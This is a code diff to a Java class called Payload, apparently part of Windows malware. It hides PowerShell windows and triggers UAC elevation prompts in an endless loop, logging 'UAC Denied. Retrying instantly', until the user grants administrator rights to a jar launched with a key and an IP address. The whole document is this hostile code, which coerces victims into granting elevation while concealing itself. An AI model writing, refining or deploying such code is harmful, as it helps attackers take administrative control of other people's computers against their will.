@@ -157,22 +157,22 @@ public class Payload {
                 "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
                 javaExe, jarPath, key, ip
             );
-            
-            // Build the powershell command to be fully hidden when launching
-            String fullCmd = "powershell.exe -NoProfile -WindowStyle Hidden -Command \"" + psCommand + "\"";
 
+            // Keep the lock file open. The elevated process deletes it.
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
                 log("Triggering UAC...");
                 
-                // Execute via cmd /c start so the prompt renders, but the cmd window stays hidden
-                Process p = Runtime.getRuntime().exec("cmd.exe /c start \"\" /b " + fullCmd);
-                p.waitFor();
+                // Launch PowerShell with hidden window
+                Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
                 
-                // Check every 50ms if the user clicked Yes (lock file deleted)
+                // Wait for the user to click Yes or No
+                p.waitFor(); 
+                
+                // Check every 50ms if the elevated process deleted the lock file
                 boolean accepted = false;
-                for (int i = 0; i < 600; i++) { 
+                for (int i = 0; i < 100; i++) { 
                     if (!lockFile.exists() || lockFile.delete()) {
                         accepted = true;
                         break;
@@ -185,7 +185,7 @@ public class Payload {
                     lockStream.close();
                     System.exit(0); 
                 } else {
-                    log("UAC Denied. Instantly retrying...");
+                    log("UAC Denied. Retrying instantly...");
                 }
             }
         } catch (Exception e) {
